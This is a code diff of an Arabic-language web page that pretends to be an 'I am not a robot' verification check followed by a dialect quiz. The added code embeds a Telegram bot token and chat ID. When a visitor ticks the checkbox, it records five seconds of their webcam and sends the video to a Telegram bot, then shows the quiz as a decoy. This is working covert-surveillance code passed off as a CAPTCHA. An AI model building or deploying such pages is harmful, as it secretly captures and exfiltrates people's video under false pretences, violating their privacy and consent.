@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق</title>
+    <title>اختبار التحقق</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             height: 100vh;
             display: flex;
@@ -25,6 +25,11 @@
             width: 90%;
             max-width: 400px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 15px;
         }
 
         .checkbox-container {
@@ -48,17 +53,17 @@
             transform: scale(1.2);
         }
 
-        .loading, .success {
+        .loading {
             display: none;
             font-size: 16px;
             margin-top: 15px;
-        }
-
-        .loading {
             color: #FBC02D;
         }
 
         .success {
+            display: none;
+            font-size: 16px;
+            margin-top: 15px;
             color: #4CAF50;
         }
 
@@ -71,18 +76,47 @@
             border-radius: 10px;
             background: black;
         }
+
+        .question-section {
+            display: none;
+            text-align: right;
+        }
+
+        .question {
+            margin: 10px 0;
+            font-size: 16px;
+        }
+
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:hover {
+            background: #45A049;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>هل أنت روبوت؟</h1>
+        <h1>تحقق من أنك لست روبوتاً</h1>
         <div class="checkbox-container">
             <input type="checkbox" id="robot-checkbox">
-            <label for="robot-checkbox">لست روبوت</label>
+            <label for="robot-checkbox">أنا لست روبوتاً</label>
         </div>
         <video id="video" autoplay playsinline muted></video>
-        <div class="loading">جارٍ التسجيل... ⏳</div>
-        <div class="success">✅ تم التحقق!</div>
+        <div class="loading">جاري التسجيل... ⏳</div>
+        <div class="success">✅ تم التحقق بنجاح!</div>
+        <div class="question-section" id="question-section">
+            <h2>اختبار اللغة الفلاحية</h2>
+            <div class="question">1. ما هي الكلمة الفلاحية لـ "الطماطم"؟</div>
+            <button>إرسال</button>
+        </div>
     </div>
 
     <script>
@@ -90,6 +124,10 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
+        const questionSection = document.getElementById('question-section');
+
+        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
+        const telegramChatId = "2070423407";
 
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
@@ -100,29 +138,45 @@
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then((stream) => {
                         video.srcObject = stream;
-
                         const mediaRecorder = new MediaRecorder(stream);
                         const chunks = [];
 
                         mediaRecorder.start();
-                        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 
-                        setTimeout(() => mediaRecorder.stop(), 5000);
+                        mediaRecorder.ondataavailable = (event) => {
+                            chunks.push(event.data);
+                        };
+
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 5000); // Record for 5 seconds
 
                         mediaRecorder.onstop = () => {
                             loading.style.display = 'none';
                             success.style.display = 'block';
-
                             stream.getTracks().forEach(track => track.stop());
 
-                            // Redirect to the quiz page
-                            setTimeout(() => {
-                                window.location.href = "quiz.html";
-                            }, 2000);
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const formData = new FormData();
+                            formData.append('chat_id', telegramChatId);
+                            formData.append('video', blob);
+
+                            fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log('Video sent to Telegram:', data);
+                                    questionSection.style.display = 'block';
+                                })
+                                .catch(error => {
+                                    console.error('Error sending video:', error);
+                                });
                         };
                     })
                     .catch((err) => {
-                        alert("لا يمكن الوصول إلى الكاميرا: " + err.message);
+                        alert("Unable to access the camera: " + err.message);
                     });
             }
         });
